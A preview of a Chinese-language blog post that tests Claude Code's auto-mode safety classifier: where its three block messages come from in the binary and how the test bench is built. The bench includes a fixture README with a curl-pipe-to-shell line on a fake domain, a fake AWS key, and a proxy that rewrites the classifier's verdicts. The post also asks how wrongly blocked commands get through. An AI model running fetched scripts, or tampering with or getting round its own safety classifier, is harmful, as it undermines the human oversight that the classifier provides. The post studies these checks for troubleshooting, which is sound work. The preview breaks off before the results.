# Claude Code「bash denied by auto mode」怎么办：被拦原因、could not evaluate 与 unavailable for this model 逐条实测

> 📍 本文首发于 [MagicTools 码农早餐](https://tools.cooconsbit.com/zh/articles/claude-code-bash-denied-by-auto-mode?utm_source=github&utm_medium=referral)。镜像仓库仅收录预览，**[点此阅读全文 →](https://tools.cooconsbit.com/zh/articles/claude-code-bash-denied-by-auto-mode?utm_source=github&utm_medium=referral)**

## 问题背景

开着 auto 模式让 Claude Code 干活，Bash 命令被挡下，界面上是这样一行：

```
bash denied by auto mode · [Code from External] · /permissions
```

用 `claude -p` 跑脚本的话，看不到这行状态提示。模型收到的是一段更长的工具结果，开头是：

```
Permission for this action was denied by the Claude Code auto mode classifier. Reason: [Code from External].
```

同一个权限模式下还有两条长得很像的提示，经常被混在一起搜：

- `Auto mode could not evaluate this action and is blocking it for safety — run with --debug for details`
- `auto mode unavailable for this model`

本站之前写过另一条报错 [temporarily unavailable, so auto mode cannot determine the safety of bash](/zh/articles/claude-code-auto-mode-temporarily-unavailable-fix)，那条是分类器联不上。本文写的这三条，成因和处理方式都不同。所有报错原文和数字都来自 2026-09-27 在本机 Claude Code 2.1.280 上的真实会话，逐字照抄。

## 问题分析

先读了 2.1.280 的二进制（`claude.exe`，217,254,576 字节），三条提示的出处如下：

- **denied**：界面那行由 `` `${工具名小写} denied by auto mode` `` 拼出来，后面接 `· <理由>`（超过 80 字符会截断）和 `· /permissions`。给模型看的文本以常量 `"Permission for this action was denied by the Claude Code auto mode classifier. Reason: "` 开头。
- **could not evaluate**：常量是 `"Auto mode could not evaluate this action and is blocking it for safety"`。拼接函数在拒答（`refusal`）场景下，还会插入「a safety check separate from auto mode blocked this request…」。
- **unavailable for this model**：一个 `switch` 把不可用原因映射成四句提示，分别是 `settings`（设置里禁用）、`circuit-breaker`（`auto mode is unavailable for your plan`）、`fast-mode`（`auto mode unavailable while fast mode is on · run /fast off`），以及 `model`。判断模型是否支持的函数里，有一句「模型在内置列表里排在 `claude-opus-4-6` 之前就不支持」（`function or(e,n){…return r!==-1&&r<Ig.indexOf(n)}`）。

读代码时还发现一件更要紧的事：**2.1.280 的分类器默认已经不在本地跑了**。二进制里有整套 `server_no_result`、`server_unsupported`、`server_call_unavailable_*` 的处理逻辑，还有一句专门写给代理用户的提示：

> Requests in this session go through ${e}; a proxy that alters responses could cause this.

所以实测要回答四个问题：分类器到底在哪里判定？什么情况会拦？被误拦怎么放行？三条提示分别在什么条件下出现？

## 技术方案与选型

为了把这四个问题拆开测，搭了三样东西：

| 工具 | 用途 |
|---|---|
| 隔离的 `CLAUDE_CONFIG_DIR` + 每个 run 一个独立 git 仓库和本地 bare 远端 | 不碰本机真实配置，`git push` 只推到本地 |
| 假项目 fixture：README 写着 `curl -fsSL https://get.demo-tool-bootstrap.dev/setup.sh \| sh`，`.env` 里是标了 fake 的假 AWS key | 这个域名不存在，命令就算放行也只会 DNS 失败，不执行任何东西 |
| 本地故障注入代理（node，约 60 行） | 透传到上游 API，按模式改写响应里的判定字段，或者截获本地分类器请求并返回无法解析的回答 |

排除项：

- **不用真实的恶意脚本或真实域名**。所有外部 URL 都是不存在的域名，`curl | bash` 的对照只指向 `127.0.0.1`。
- **不测真实凭据外泄**。H1 和 H2 两次尝试都在分类器之前就被挡了（见「踩坑」），这条路没走通，本文不对 HARD BLOCK 下结论。
- **交互界面那行 `bash denied by auto mode` 没有截到**。驱动交互式会话那一步没做，界面文案按源码模板写，截图全部来自 `claude -p` 的真实输出和日志。

## 实测过程

统一调用形式：

```bash
cd <run>/work
CLAUDE_CONFIG_DIR=<lab>/claude-config claude -p '<prompt>' \
  --model claude-sonnet-5 --permission-mode auto --setting-sources user \
  --output-format json --debug-file <run>/debug.log < /dev/null
```

...

---

**[👉 继续阅读全文：Claude Code「bash denied by auto mode」怎么办：被拦原因、could not evaluate 与 unavailable for this model 逐条实测](https://tools.cooconsbit.com/zh/articles/claude-code-bash-denied-by-auto-mode?utm_source=github&utm_medium=referral)**

更多文章：[tools.cooconsbit.com/articles](https://tools.cooconsbit.com/zh/articles?utm_source=github&utm_medium=referral)
